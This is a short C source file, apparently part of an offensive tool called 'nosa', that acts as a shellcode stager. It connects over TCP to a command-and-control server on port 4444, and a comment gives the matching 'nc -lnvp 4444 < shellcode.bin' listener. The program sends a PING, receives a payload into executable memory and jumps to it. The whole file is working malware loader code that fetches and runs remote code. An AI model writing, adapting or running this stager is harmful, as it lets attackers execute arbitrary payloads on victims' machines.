#include "nosa.h"

/**
 * Establishes a connection to a specified host and port using a specified socket type.
 *
 * @param None
 *
 * @returns 0 upon successful execution
 */
int main()
{
    //  [ C2 Server ] 
    //  nc -lnvp 4444 < shellcode.bin
    //

    HANDLE hSocket = NULL;
    NTSTATUS Status = NULL;
    char ip_string[16] = { 0 };      // Allocate enough space for an IPv4 address in dotted notation

    const char* socketType = "TCP";  // #TODO UDP -> not working.
    // Sadly, afd!AfdConnect() call [ExFreeToLookasideListEx] with a null value when it got a UDP conn

    const char* host = "127.0.0.1"; // #TODO -> subdomain queries not working for while.
    int port = 4444;

    // Connect into remote host
    nosa_connect(&hSocket, host, port, socketType);

    // PING packet
    unsigned char pktSend[MAX_SENT_BYTES] = "PING\n";

    // Send client PING!
    nosa_send(&hSocket, pktSend, sizeof(pktSend));

    // Allocate a virtual buffer for our shellcode
    LPVOID pktRecv = VirtualAlloc(0, MAX_RECV_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memset(pktRecv, 0, MAX_RECV_BYTES); // clear our created vm alloc

    // Receive and exec TCP packet response
    nosa_recv((HANDLE*)hSocket, pktRecv, MAX_RECV_BYTES);

    // Exec
    int (*func)();
    func = (int(*)()) (BYTE*)pktRecv;
    (int)(*func)();

    return 0;
}
